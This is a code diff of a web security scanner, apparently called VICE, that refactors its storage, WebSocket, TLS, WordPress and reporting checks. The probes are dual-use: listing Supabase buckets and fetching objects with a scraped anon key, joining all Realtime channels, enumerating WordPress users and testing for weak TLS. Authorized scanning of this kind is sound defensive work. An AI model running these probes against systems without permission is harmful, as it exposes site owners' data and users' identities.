@@ -3467,7 +2689,7 @@ async function auditStorage(jsContents, spinner) {
 
     // List buckets via the API
     const bucketsRes = await safeFetch(`${supabaseUrl}/storage/v1/bucket`, {
-      headers: { 'apikey': anonKey, 'Authorization': `Bearer ${anonKey}` },
+      headers: { ...supabaseHeaders(anonKey) },
     });
 
     if (bucketsRes && bucketsRes.status === 200) {
@@ -3495,8 +2717,7 @@ async function auditStorage(jsContents, spinner) {
         method: 'POST',
         readOnly: 'storage-list',
         headers: {
-          'apikey': anonKey,
-          'Authorization': `Bearer ${anonKey}`,
+          ...supabaseHeaders(anonKey),
           'Content-Type': 'application/json',
         },
         body: JSON.stringify({ prefix: '', limit: 10, offset: 0 }),
@@ -3513,7 +2734,7 @@ async function auditStorage(jsContents, spinner) {
 
           if (hasPrivateData) {
             // Sensitive content trumps "expected public" - report regardless
-            addFinding('CRITIQUE', 'Storage', `Bucket "${bucket}" contains accessible sensitive files`, `Files: ${fileNames.join(', ')}\nThese files appear to contain private data and are accessible with the anon key.`, `Set bucket "${bucket}" to private and add RLS policies on storage.objects`);
+            addFinding('INFO', 'Storage', `Bucket "${bucket}" lists potentially sensitive filenames`, `Files: ${fileNames.join(', ')}\nOnly filenames were listed; sensitivity and object access are not established.`, `Set bucket "${bucket}" to private and add RLS policies on storage.objects`);
           } else if (isExpectedPublic) {
             // Public bucket with non-sensitive content: this is the intended setup
             addFinding('INFO', 'Storage', `Bucket "${bucket}" listable (public bucket, ${files.length} file(s))`, `Files: ${fileNames.join(', ')}\nBucket is marked public or named by a public-by-convention pattern.`, '');
@@ -3521,16 +2742,18 @@ async function auditStorage(jsContents, spinner) {
             addFinding('INFO', 'Storage', `Bucket "${bucket}" listable with anon key (${files.length} file(s))`, `Files: ${fileNames.join(', ')}`, `Verify that listing is intentional for this bucket.`, { classification: 'confirmed', confidence: 'high', rule_id: 'vice/storage/anonymous-listing' });
           }
 
-          // Test direct file access (only flag if bucket is NOT expected public)
-          if (!isExpectedPublic) {
+          // Inspect object contents before assigning impact.
+          {
             for (const file of files.slice(0, 3)) {
               if (!file.name) continue;
-              const fileUrl = `${supabaseUrl}/storage/v1/object/public/${bucket}/${file.name}`;
+              const fileUrl = objectUrl(supabaseUrl, bucket, file.name);
+              if (!fileUrl) continue;
               const fileRes = await safeFetch(fileUrl);
               if (fileRes && fileRes.status === 200) {
                 const ct = fileRes.headers.get('content-type') || '';
-                const sensitive = sensitiveFileName(file.name);
-                addFinding(sensitive ? 'ELEVEE' : 'INFO', 'Storage', `File publicly accessible: ${bucket}/${file.name}`, `URL: ${fileUrl}\nContent-Type: ${ct}`, sensitive ? 'Move sensitive files to a private bucket and enforce object policies.' : '', { classification: 'confirmed', confidence: 'high', rule_id: sensitive ? 'vice/storage/public-sensitive-file' : 'vice/storage/public-file' });
+                const exposure = await inspectPublicObject(fileRes);
+                const sensitive = Boolean(exposure);
+                addFinding(exposure?.severity || 'INFO', 'Storage', `File publicly accessible: ${bucket}/${file.name}`, `URL: ${fileUrl}\nContent-Type: ${ct}\n${exposure?.evidence || 'No sensitive content established.'}`, sensitive ? 'Move sensitive files to a private bucket and enforce object policies.' : '', { classification: sensitive && exposure.kind !== 'credentials' ? 'probable' : 'confirmed', confidence: 'high', rule_id: sensitive ? 'vice/storage/public-sensitive-file' : 'vice/storage/public-file' });
               }
             }
           }
@@ -3540,15 +2763,16 @@ async function auditStorage(jsContents, spinner) {
     }
   }
 
-  // Test found S3 URLs
+  // Inspect observed cloud storage objects.
   for (const url of storageUrls) {
-    if (url.includes('s3') && url.includes('amazonaws.com')) {
+    if (/^https?:\/\//.test(url) && /amazonaws\.com|storage\.googleapis\.com|firebasestorage\.googleapis\.com/.test(new URL(url).hostname)) {
       if (!await authorizeDiscoveredDestination(url)) continue;
-      spinner.text = `Testing S3 bucket: ${url.substring(0, 60)}...`;
+      spinner.text = `Testing storage object: ${url.substring(0, 60)}...`;
       const res = await safeFetch(url);
       if (res && res.status === 200) {
-        const sensitive = sensitiveFileName(new URL(url).pathname);
-        addFinding(sensitive ? 'ELEVEE' : 'INFO', 'Storage', `S3 file publicly accessible`, `URL: ${url}`, sensitive ? 'Move sensitive files to a private bucket and review its bucket policy.' : '', { classification: 'confirmed', confidence: 'high', rule_id: sensitive ? 'vice/storage/public-sensitive-s3-file' : 'vice/storage/public-s3-file' });
+        const exposure = await inspectPublicObject(res);
+        const sensitive = Boolean(exposure);
+        addFinding(exposure?.severity || 'INFO', 'Storage', `Storage object publicly accessible`, `URL: ${url}\n${exposure?.evidence || 'No sensitive content established.'}`, sensitive ? 'Move sensitive files to a private bucket and review its bucket policy.' : '', { classification: sensitive && exposure.kind !== 'credentials' ? 'probable' : 'confirmed', confidence: 'high', rule_id: sensitive ? 'vice/storage/public-sensitive-s3-file' : 'vice/storage/public-s3-file' });
       }
     }
   }
@@ -3569,7 +2793,7 @@ async function auditWebsockets(baseUrl, jsContents, spinner) {
   // Search for WebSocket URLs in JS
   const commonWsPaths = ['/ws', '/wss', '/websocket', '/socket.io/?EIO=4&transport=websocket', '/realtime', '/cable', '/hub', '/live', '/events'];
   const commonWsUrls = new Set(commonWsPaths.map(path => wsOrigin + path));
-  const wsUrls = new Set(commonWsUrls);
+  const wsUrls = new Set([...(getScanContext()?.webSockets?.keys() || []), ...commonWsUrls]);
   const wsPatterns = [
     /wss?:\/\/[^\s"'`<>)}\]]+/gi,
     /\/realtime\/v1/g,
@@ -3596,22 +2820,9 @@ async function auditWebsockets(baseUrl, jsContents, spinner) {
     }
   }
 
-  // Search for Supabase Realtime
-  let supabaseUrl = null;
-  let anonKey = null;
-  for (const js of jsContents) {
-    const urlMatch = js.match(/https?:\/\/[a-z0-9\-]+\.supabase\.co/i);
-    if (urlMatch && !supabaseUrl) supabaseUrl = urlMatch[0];
-    const keyMatch = js.match(/eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/);
-    if (keyMatch && !anonKey) {
-      try {
-        const payload = JSON.parse(Buffer.from(keyMatch[0].split('.')[1], 'base64url').toString());
-        if (payload.role === 'anon') anonKey = keyMatch[0];
-      } catch {}
-    }
-  }
+  const { url: supabaseUrl, key: anonKey } = discoverSupabase(jsContents);
 
-  if (supabaseUrl) {
+  if (supabaseUrl && anonKey) {
     boundedAdd(wsUrls, `${supabaseUrl.replace('https://', 'wss://').replace('http://', 'ws://')}/realtime/v1/websocket?apikey=${anonKey}&vsn=1.0.0`, DISCOVERY_BUDGETS.websocketUrls);
   }
 
@@ -3643,7 +2854,7 @@ async function auditWebsockets(baseUrl, jsContents, spinner) {
 
     const page = await createBrowserPage(browser, baseUrl);
     try {
-      const result = await page.evaluate(async (url) => {
+      const result = await page.evaluate(async ({ url, frames }) => {
         return new Promise((resolve) => {
           const timeout = setTimeout(() => resolve({ status: 'timeout' }), 5000);
           try {
@@ -3652,7 +2863,8 @@ async function auditWebsockets(baseUrl, jsContents, spinner) {
 
             ws.onopen = () => {
               // Try to listen to all channels (Supabase Realtime)
-              if (url.includes('realtime')) {
+              for (const frame of frames) ws.send(frame);
+              if (url.includes('realtime') && frames.length === 0) {
                 ws.send(JSON.stringify({
                   topic: 'realtime:*',
                   event: 'phx_join',
@@ -3667,6 +2879,10 @@ async function auditWebsockets(baseUrl, jsContents, spinner) {
             };
 
             ws.onmessage = (event) => {
+              if (url.includes('socket.io') && typeof event.data === 'string') {
+                if (event.data.startsWith('0')) ws.send('40');
+                if (event.data === '2') ws.send('3');
+              }
               messages.push(typeof event.data === 'string' ? event.data.substring(0, 500) : '[binary]');
               if (messages.length >= 3) {
                 clearTimeout(timeout);
@@ -3696,7 +2912,7 @@ async function auditWebsockets(baseUrl, jsContents, spinner) {
             resolve({ status: 'error', error: e.message });
           }
         });
-      }, wsUrl);
+      }, { url: wsUrl, frames: getScanContext()?.webSockets?.get(wsUrl) || [] });
 
       if (result.status === 'open' && result.messages && result.messages.length > 0) {
         const signal = classifyWebSocketMessages(result.messages);
@@ -3784,6 +3000,7 @@ async function auditTls(baseUrl, spinner) {
   });
 
   if (!certInfo || !certInfo.cert || !certInfo.cert.valid_to) {
+    getScanContext()?.limitations.add('tls_handshake_unavailable');
     addFinding('INFO', 'TLS', 'TLS handshake failed', `Could not complete TLS handshake with ${host}:${port}`, 'Verify the host accepts TLS connections on port 443');
     return;
   }
@@ -3791,7 +3008,7 @@ async function auditTls(baseUrl, spinner) {
   const cert = certInfo.cert;
   const authorization = classifyTlsAuthorization(certInfo.authorized, certInfo.authorizationError);
   if (authorization) {
-    addFinding(authorization.severity, 'TLS', authorization.title, `Validation error: ${authorization.error}\nHost: ${host}`, 'Install a certificate whose chain is trusted and whose SAN entries include the scanned hostname.');
+    addFinding(authorization.severity, 'TLS', authorization.title, `Validation error: ${authorization.error}\nHost: ${host}`, 'Install a certificate whose chain is trusted and whose SAN entries include the scanned hostname.', { classification: 'confirmed', confidence: 'high', cause_key: 'tls-certificate' });
   }
 
   const keyIssue = classifyTlsPublicKey(certInfo.keyType, certInfo.keyDetails || {});
@@ -3809,7 +3026,7 @@ async function auditTls(baseUrl, spinner) {
   const validTo = new Date(cert.valid_to);
   const daysLeft = Math.floor((validTo.getTime() - Date.now()) / (1000 * 60 * 60 * 24));
   if (daysLeft < 0) {
-    addFinding('CRITIQUE', 'TLS', `Certificate EXPIRED ${Math.abs(daysLeft)} day(s) ago`, `Expired on ${cert.valid_to}\nBrowsers will refuse to connect.`, 'Renew the certificate immediately');
+    addFinding('CRITIQUE', 'TLS', `Certificate EXPIRED ${Math.abs(daysLeft)} day(s) ago`, `Expired on ${cert.valid_to}\nBrowsers will refuse to connect.`, 'Renew the certificate immediately', { classification: 'confirmed', confidence: 'high', cause_key: 'tls-certificate' });
   } else if (daysLeft < 7) {
     addFinding('ELEVEE', 'TLS', `Certificate expires in ${daysLeft} day(s)`, `Expires on ${cert.valid_to}\nIssuer: ${issuerCN}`, 'Renew immediately. Verify auto-renewal is configured (certbot --renew, caddy auto-renew, etc.)');
   } else if (daysLeft < 14) {
@@ -3845,27 +3062,18 @@ async function auditTls(baseUrl, spinner) {
     addFinding('CRITIQUE', 'TLS', `Weak cipher suite: ${certInfo.cipher.name}`, '', 'Disable weak ciphers in your TLS config. Recommended: TLS_AES_256_GCM_SHA384, TLS_CHACHA20_POLY1305_SHA256, ECDHE-RSA-AES256-GCM-SHA384.');
   }
 
-  // Test deprecated TLS versions
-  spinner.text = 'TLS: probing legacy protocol versions...';
-  for (const oldVer of ['TLSv1', 'TLSv1.1']) {
-    const supported = await new Promise((resolve) => {
-      let resolved = false;
-      const done = (v) => { if (!resolved) { resolved = true; resolve(v); } };
-      try {
-        const socket = tls.default.connect({
-          host, port, servername: host, timeout: 4000,
-          minVersion: oldVer, maxVersion: oldVer,
-          rejectUnauthorized: false,
-        }, () => { socket.end(); done(true); });
-        socket.on('error', () => done(false));
-        socket.on('timeout', () => { socket.destroy(); done(false); });
-      } catch {
-        done(false);
-      }
-    });
-    if (supported) {
-      addFinding('ELEVEE', 'TLS', `${oldVer} accepted (deprecated)`, `${oldVer} has known vulnerabilities (BEAST, POODLE, etc.) and is removed from modern browsers.`, `Disable ${oldVer} in nginx: ssl_protocols TLSv1.2 TLSv1.3;\nIn Apache: SSLProtocol -all +TLSv1.2 +TLSv1.3`);
-    }
+  const probes = [
+    ...['TLSv1', 'TLSv1.1'].map(version => ({ minVersion: version, maxVersion: version })),
+    ...weakTlsCiphers().map(ciphers => ({ minVersion: 'TLSv1.2', maxVersion: 'TLSv1.2', ciphers })),
+  ];
+  for (const probe of probes) {
+    const result = await probeTls({ host: connectHost, port, servername: host, signal: getScanContext()?.signal, ...probe });
+    if (result.state === 'accepted') addFinding('ELEVEE', 'TLS', `Deprecated TLS configuration accepted: ${probe.ciphers || probe.maxVersion}`,
+      `Protocol: ${result.protocol}. Cipher: ${result.cipher}. A constrained handshake succeeded.`,
+      'Disable deprecated protocols and weak cipher suites.', { rule_id: 'vice/tls/deprecated-handshake', classification: 'confirmed', confidence: 'high' });
+    if (result.state === 'unknown') addFinding('INFO', 'TLS', 'TLS compatibility probe was inconclusive',
+      `Probe: ${probe.ciphers || probe.maxVersion}. Reason: ${result.reason}. No server rejection is established.`, '',
+      { rule_id: 'vice/tls/probe-inconclusive', classification: 'informational', confidence: 'high' });
   }
 }
 
@@ -4006,6 +3214,7 @@ async function auditWordPress(baseUrl, jsContents, spinner) {
   }
 
   addFinding('INFO', 'WordPress', 'WordPress detected - running WP-specific checks', '', '');
+  await auditWordpressRoutes(baseUrl, safeFetch, addFinding);
 
   // 1. User enumeration via ?author=N (redirects to /author/{username}/)
   spinner.text = 'WordPress: enumerating users via ?author=N...';
@@ -4092,16 +3301,19 @@ async function auditWordPress(baseUrl, jsContents, spinner) {
 
 // ──────────── SCORE DE SECURITE ────────────
 
-export function calculateScanScore(sourceFindings = findings) {
-  return calculateCoreScore(sourceFindings, { minConfidence: 'medium' });
+export function calculateScanScore(sourceFindings = findings, options = {}) {
+  return calculateCoreScore(sourceFindings, { ...options, minConfidence: 'medium' });
 }
 
 // ──────────── RAPPORT ────────────
 
-function printReport() {
-  const { score, grade, color } = calculateScanScore();
+function printReport(result = null) {
+  const { score, grade, presentation } = buildBlackBoxReport(result?.target || '', result);
+  const color = presentation.tone === 'error' ? chalk.red.bold : presentation.tone === 'success' ? chalk.green.bold : chalk.yellow.bold;
 
   console.log('\n');
+  if (presentation.critical) console.log(chalk.red('Critical findings require attention regardless of the numeric score.'));
+  if (presentation.provisional) console.log(chalk.yellow('Provisional score: requested checks were not fully verified.'));
   console.log(chalk.bold('━'.repeat(60)));
   console.log(chalk.hex('#995ff6').bold('  VICE') + chalk.gray(' - Rapport d\'audit de securite'));
   console.log(chalk.gray('  Webba Creative Technologies'));
@@ -4109,10 +3321,10 @@ function printReport() {
 
   // Score
   console.log('');
-  console.log(`  Score de securite: ${color(` ${grade} `)} ${chalk.gray(`(${score}/100)`)}`);
+  console.log(`  Score de securite: ${color(` ${grade ?? 'N/A'} `)} ${chalk.gray(`(${score ?? 'N/A'}/100)`)}`);
 
   if (findings.length === 0) {
-    console.log(chalk.green('\n  Aucune faille detectee. Bon travail !\n'));
+    console.log(chalk.gray('\n  No findings on the checked surface.\n'));
     return;
   }
 
@@ -4148,7 +3360,7 @@ function printReport() {
   }
 
   console.log('\n' + chalk.bold('━'.repeat(60)));
-  console.log(`  Score: ${color(` ${grade} `)} (${score}/100) - Total: ${findings.length} finding(s)`);
+  console.log(`  Score: ${color(` ${grade ?? 'N/A'} `)} (${score ?? 'N/A'}/100) - Total: ${findings.length} finding(s)`);
   console.log(chalk.gray(`  VICE v${ENGINE_VERSION} - Webba Creative Technologies (c) 2026`));
   console.log(chalk.bold('━'.repeat(60)) + '\n');
 }
@@ -4156,20 +3368,30 @@ function printReport() {
 export function buildBlackBoxReport(url, result = null, date = new Date().toISOString()) {
   const calculated = result?.score_breakdown || calculateScanScore(result?.findings || findings);
   const hasResultScore = result && Object.hasOwn(result, 'score');
-  const hasResultGrade = result && Object.hasOwn(result, 'grade');
+  const candidateScore = hasResultScore ? result.score : calculated.score;
+  const grade = gradeForScore(candidateScore);
+  const score = grade === null ? null : candidateScore;
   return {
     url,
     date,
-    score: hasResultScore ? result.score : calculated.score,
-    grade: hasResultGrade ? result.grade : calculated.grade,
+    score,
+    grade,
     engine_version: result?.engine_version || ENGINE_VERSION,
     ruleset_version: result?.ruleset_version || RULESET_VERSION,
     scoring_version: result?.scoring_version || SCORING_VERSION,
+    presentation: scorePresentation(score, {
+      criticalCount: (result?.findings || findings).filter(f => !f.baselined && ['CRITICAL', 'CRITIQUE'].includes(f.severity)).length,
+      highCount: (result?.findings || findings).filter(f => !f.baselined && ['HIGH', 'ELEVEE'].includes(f.severity)).length,
+      reliable: result?.score_reliable,
+      coverageStatus: result?.coverage?.status,
+      authStatus: result?.authentication?.status,
+    }),
     score_reliable: result?.score_reliable ?? null,
     modules: result?.modules || null,
     errors: result?.errors || [],
     metrics: result?.metrics || null,
     coverage: result?.coverage || null,
+    check_outcomes: result?.check_outcomes || [],
     ai_rag_audit: result?.ai_rag_audit || null,
     score_breakdown: {
       total_penalty: calculated.total_penalty,
@@ -4192,8 +3414,9 @@ async function exportJson(url, result = null) {
   console.log(chalk.gray(`  Rapport JSON exporte: ${filename}\n`));
 }
 
-async function exportHtml(url) {
-  const { score, grade } = calculateScanScore();
+async function exportHtml(url, result = null) {
+  const report = buildBlackBoxReport(url, result);
+  const { score, grade, presentation } = report;
   const hostname = new URL(url).hostname;
   const fs = await import('fs');
   const path = await import('path');
@@ -4210,7 +3433,9 @@ async function exportHtml(url) {
   const sorted = [...findings].sort((a,b) => (sevOrder[a.severity]??5) - (sevOrder[b.severity]??5));
   const sevColors = {CRITICAL:'#c0392b',CRITIQUE:'#c0392b',HIGH:'#d35400',ELEVEE:'#d35400',MEDIUM:'#b8860b',MOYENNE:'#b8860b',LOW:'#5b7ea1',FAIBLE:'#5b7ea1',INFO:'#8e99a4'};
   const sevLabels = {CRITICAL:'Critical',CRITIQUE:'Critical',HIGH:'High',ELEVEE:'High',MEDIUM:'Medium',MOYENNE:'Medium',LOW:'Low',FAIBLE:'Low',INFO:'Info'};
-  const gradeColors = {A:'#27ae60',B:'#2e86c1',C:'#b8860b',D:'#c0392b',E:'#7b241c',F:'#4a1410'};
+  const gradeColors = { [grade]: presentation.tone === 'error' ? '#c0392b' : presentation.tone === 'success' ? '#27ae60' : '#b8860b' };
+  const warningsHtml = (presentation.critical ? '<p>Critical findings require attention regardless of the numeric score.</p>' : '')
+    + (presentation.provisional ? '<p>Provisional score: requested checks were not fully verified.</p>' : '');
   let findingsHtml = '';
   let currentModule = '';
   for (const f of sorted) {
@@ -4222,7 +3447,7 @@ async function exportHtml(url) {
   const statsHtml = allSevs.filter(s=>counts[s]).map(s=>`<span class="stat-pill" style="background:${sevColors[s]}">${sevLabels[s]} ${counts[s]}</span>`).join('');
   const dateStr = new Date().toLocaleDateString('en-US',{year:'numeric',month:'long',day:'numeric'});
   const timeStr = new Date().toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit'});
-  const html = `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; img-src data:; base-uri 'none'; form-action 'none'"><title>VICE Report - ${safeHostname}</title><style>:root{--primary:#995ff6;--accent:#ee967a;--bg:#fafafa;--card:#fff;--text:#2c2c2c;--text-light:#6b6b6b;--text-muted:#9a9a9a;--border:#e8e8e8}*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(--text);line-height:1.6;-webkit-font-smoothing:antialiased}.container{max-width:780px;margin:0 auto;padding:48px 24px 64px}.header{margin-bottom:48px}.header-top{display:flex;align-items:center;justify-content:space-between;margin-bottom:32px}.logo{font-size:14px;font-weight:600;color:var(--primary);letter-spacing:2px;text-transform:uppercase}.date{font-size:13px;color:var(--text-muted)}.target{font-size:28px;font-weight:700;color:var(--text);margin-bottom:4px;word-break:break-all}.target-url{font-size:14px;color:var(--text-light);margin-bottom:32px}.score-section{display:flex;align-items:center;gap:24px;padding:28px 32px;background:var(--card);border:1px solid var(--border);border-radius:12px;margin-bottom:24px}.grade-circle{width:72px;height:72px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:32px;font-weight:800;color:#fff;flex-shrink:0}.score-info{flex:1}.score-number{font-size:20px;font-weight:700;color:var(--text)}.score-label{font-size:13px;color:var(--text-muted);margin-top:2px}.stats{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:40px}.stat-pill{display:inline-block;padding:4px 14px;border-radius:100px;font-size:12px;font-weight:600;color:#fff;letter-spacing:.3px}.module-title{font-size:16px;font-weight:700;color:var(--text);margin-top:36px;margin-bottom:16px;padding-bottom:8px;border-bottom:1px solid var(--border)}.module-title:first-child{margin-top:0}.finding{padding:16px 20px;background:var(--card);border:1px solid var(--border);border-radius:8px;margin-bottom:10px}.finding-header{display:flex;align-items:flex-start;gap:10px;margin-bottom:6px}.badge{display:inline-block;padding:2px 10px;border-radius:4px;font-size:11px;font-weight:700;color:#fff;text-transform:uppercase;letter-spacing:.5px;flex-shrink:0;margin-top:2px}.finding-title{font-size:14px;font-weight:600;color:var(--text);line-height:1.4}.finding-detail{font-family:'SF Mono','Fira Code','Consolas',monospace;font-size:12px;line-height:1.5;color:var(--text-light);background:#f5f5f5;border:1px solid var(--border);border-radius:6px;padding:12px 14px;margin:8px 0;white-space:pre-wrap;word-break:break-word;overflow-x:auto}.finding-reco{font-size:13px;color:#27ae60;margin-top:8px;padding-left:2px;line-height:1.5}.finding-reco::before{content:"\\2192  "}.footer{margin-top:56px;padding-top:24px;border-top:1px solid var(--border);text-align:center;font-size:12px;color:var(--text-muted);line-height:1.8}.footer a{color:var(--primary);text-decoration:none}.footer a:hover{text-decoration:underline}@media(max-width:600px){.container{padding:24px 16px 48px}.header-top{flex-direction:column;align-items:flex-start;gap:8px}.target{font-size:22px}.score-section{flex-direction:column;text-align:center;padding:24px}.finding-header{flex-direction:column;gap:6px}}</style></head><body><div class="container"><div class="header"><div class="header-top"><div class="logo">VICE</div><div class="date">${dateStr} at ${timeStr}</div></div><div class="target">${safeHostname}</div><div class="target-url">${safeUrl}</div></div><div class="score-section"><div class="grade-circle" style="background:${gradeColors[grade]||'#888'}">${grade}</div><div class="score-info"><div class="score-number">${score} / 100</div><div class="score-label">${findings.length} finding${findings.length!==1?'s':''} detected</div></div></div><div class="stats">${statsHtml}</div>${findingsHtml}<div class="footer">Generated by <a href="https://github.com/Webba-Creative-Technologies/vice">VICE</a> v3.0<br><a href="https://webba-creative.com">Webba Creative Technologies</a> &copy; 2026<br>This tool is intended for authorized security testing only.</div></div></body></html>`;
+  const html = `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; img-src data:; base-uri 'none'; form-action 'none'"><title>VICE Report - ${safeHostname}</title><style>:root{--primary:#995ff6;--accent:#ee967a;--bg:#fafafa;--card:#fff;--text:#2c2c2c;--text-light:#6b6b6b;--text-muted:#9a9a9a;--border:#e8e8e8}*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(--text);line-height:1.6;-webkit-font-smoothing:antialiased}.container{max-width:780px;margin:0 auto;padding:48px 24px 64px}.header{margin-bottom:48px}.header-top{display:flex;align-items:center;justify-content:space-between;margin-bottom:32px}.logo{font-size:14px;font-weight:600;color:var(--primary);letter-spacing:2px;text-transform:uppercase}.date{font-size:13px;color:var(--text-muted)}.target{font-size:28px;font-weight:700;color:var(--text);margin-bottom:4px;word-break:break-all}.target-url{font-size:14px;color:var(--text-light);margin-bottom:32px}.score-section{display:flex;align-items:center;gap:24px;padding:28px 32px;background:var(--card);border:1px solid var(--border);border-radius:12px;margin-bottom:24px}.grade-circle{width:72px;height:72px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:32px;font-weight:800;color:#fff;flex-shrink:0}.score-info{flex:1}.score-number{font-size:20px;font-weight:700;color:var(--text)}.score-label{font-size:13px;color:var(--text-muted);margin-top:2px}.stats{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:40px}.stat-pill{display:inline-block;padding:4px 14px;border-radius:100px;font-size:12px;font-weight:600;color:#fff;letter-spacing:.3px}.module-title{font-size:16px;font-weight:700;color:var(--text);margin-top:36px;margin-bottom:16px;padding-bottom:8px;border-bottom:1px solid var(--border)}.module-title:first-child{margin-top:0}.finding{padding:16px 20px;background:var(--card);border:1px solid var(--border);border-radius:8px;margin-bottom:10px}.finding-header{display:flex;align-items:flex-start;gap:10px;margin-bottom:6px}.badge{display:inline-block;padding:2px 10px;border-radius:4px;font-size:11px;font-weight:700;color:#fff;text-transform:uppercase;letter-spacing:.5px;flex-shrink:0;margin-top:2px}.finding-title{font-size:14px;font-weight:600;color:var(--text);line-height:1.4}.finding-detail{font-family:'SF Mono','Fira Code','Consolas',monospace;font-size:12px;line-height:1.5;color:var(--text-light);background:#f5f5f5;border:1px solid var(--border);border-radius:6px;padding:12px 14px;margin:8px 0;white-space:pre-wrap;word-break:break-word;overflow-x:auto}.finding-reco{font-size:13px;color:#27ae60;margin-top:8px;padding-left:2px;line-height:1.5}.finding-reco::before{content:"\\2192  "}.footer{margin-top:56px;padding-top:24px;border-top:1px solid var(--border);text-align:center;font-size:12px;color:var(--text-muted);line-height:1.8}.footer a{color:var(--primary);text-decoration:none}.footer a:hover{text-decoration:underline}@media(max-width:600px){.container{padding:24px 16px 48px}.header-top{flex-direction:column;align-items:flex-start;gap:8px}.target{font-size:22px}.score-section{flex-direction:column;text-align:center;padding:24px}.finding-header{flex-direction:column;gap:6px}}</style></head><body><div class="container"><div class="header"><div class="header-top"><div class="logo">VICE</div><div class="date">${dateStr} at ${timeStr}</div></div><div class="target">${safeHostname}</div><div class="target-url">${safeUrl}</div></div><div class="score-section"><div class="grade-circle" style="background:${gradeColors[grade]||'#888'}">${grade ?? 'N/A'}</div><div class="score-info"><div class="score-number">${score ?? 'N/A'} / 100</div><div class="score-label">${findings.length} finding${findings.length!==1?'s':''} detected</div></div></div>${warningsHtml}<div class="stats">${statsHtml}</div>${findingsHtml}<div class="footer"><a href="https://github.com/Webba-Creative-Technologies/vice">VICE</a> v3.0<br><a href="https://webba-creative.com">Webba Creative Technologies</a> &copy; 2026<br>This tool is intended for authorized security testing only.</div></div></body></html>`;
   fs.writeFileSync(filename, html.replace('VICE</a> v3.0<br>', `VICE</a> v${ENGINE_VERSION}<br>`));
   console.log(chalk.gray(`  HTML report exported: ${filename}\n`));
 }
@@ -4297,8 +3522,10 @@ async function viewHistory() {
   console.log(chalk.gray('  Webba Creative Technologies'));
   console.log(chalk.bold('━'.repeat(60)));
 
-  const gradeColors = { A: chalk.green.bold, B: chalk.cyan.bold, C: chalk.yellow.bold, D: chalk.red.bold, E: chalk.bgRed.white.bold, F: chalk.bgRed.white.bold };
-  const gradeColorFn = gradeColors[scan.grade] || chalk.white;
+  const presentation = buildBlackBoxReport(scan.data.url, scan.data).presentation;
+  const gradeColorFn = presentation.tone === 'error' ? chalk.red.bold : presentation.tone === 'success' ? chalk.green.bold : chalk.yellow.bold;
+  if (presentation.critical) console.log(chalk.red('Critical findings require attention regardless of the numeric score.'));
+  if (presentation.provisional) console.log(chalk.yellow('Provisional score: requested checks were not fully verified.'));
   console.log(`\n  Score: ${gradeColorFn(` ${scan.grade} `)} ${chalk.gray(`(${scan.score}/100)`)}`);
 
   const order = ['CRITIQUE', 'ELEVEE', 'MOYENNE', 'FAIBLE', 'INFO'];
@@ -4351,7 +3578,7 @@ async function viewHistory() {
     // Injecter les findings du scan charge pour l'export
     findings.length = 0;
     findings.push(...scan.data.findings);
-    await exportHtml(scan.data.url);
+    await exportHtml(scan.data.url, scan.data);
   } else if (postAction === 'delete') {
     const { confirmDelete } = await inquirer.prompt([
       { type: 'confirm', name: 'confirmDelete', message: `Supprimer ${scan.file}?`, default: false },
@@ -4457,14 +3684,19 @@ async function runScanInternal(config, httpClient, context) {
     ? { url: config.supabaseUrl, key: config.supabaseKey || null }
     : null;
 
-  if (modules.includes('js') || modules.includes('supabase') || modules.includes('authinjection') || modules.includes('api') || modules.includes('storage') || modules.includes('websocket')) {
+  if (modules.includes('attacks') || modules.includes('login') || modules.includes('js') || modules.includes('supabase') || modules.includes('authinjection') || modules.includes('api') || modules.includes('storage') || modules.includes('websocket')) {
     await executeStep('crawl', async (spinner) => {
       const result = await crawlAndExtract(baseUrl, spinner, {
+        maxPages: modules.some(module => !PASSIVE_MODULES.includes(module)) ? 16 : 4,
         reportFindings: modules.includes('js'),
         timeoutMs: config.requestTimeoutMs,
       });
       jsContents = result.scripts;
     });
+  }
+
+  if (modules.includes('stack')) {
+    await executeStep('stack', (spinner) => detectStack(baseUrl, jsContents, spinner));
   }
 
   if (modules.includes('js') && jsContents.length > 0) {
@@ -4476,13 +3708,18 @@ async function runScanInternal(config, httpClient, context) {
   }
 
   if (modules.includes('headers')) {
-    await executeStep('headers', (spinner) => checkHeaders(baseUrl, spinner));
+    await executeStep('headers', async (spinner) => {
+      const pages = [...(context.surfaces?.pages.values() || [])].filter(page => page.visited).map(page => page.url);
+      for (const url of [...new Set([baseUrl, ...pages])].slice(0, 6)) await checkHeaders(url, spinner);
+    });
   }
 
   if (modules.includes('ai-rag')) {
     aiRagAudit = await executeStep('ai-rag', async (spinner) => {
       const result = await auditAiRag(baseUrl, config.aiRag, {
         fetch: safeFetch,
+        observedEndpoints: [...(context.surfaces?.requests.values() || [])].map(request => request.url),
+        observedSources: jsContents,
         onPhase: (phase) => {
           spinner.text = `Testing AI/RAG ${phase}`;
           emitScanProgress(config.onProgress, {
@@ -4542,6 +3779,10 @@ async function runScanInternal(config, httpClient, context) {
     await executeStep('dns', (spinner) => auditDns(baseUrl, spinner));
   }
 
+  if (modules.includes('api') || modules.includes('authinjection')) {
+    await auditObjectAuthorization({ inventory: context.surfaces, baseUrl, profiles: config.authorizationProfiles, fetch: safeFetch, finding: addFinding, outcome: state => recordAuditCheck(context, 'authorization', state) });
+  }
+
   if (modules.includes('api') && jsContents.length > 0) {
     await executeStep('api', (spinner) => auditApiEndpoints(baseUrl, jsContents, spinner));
   }
@@ -4562,13 +3803,10 @@ async function runScanInternal(config, httpClient, context) {
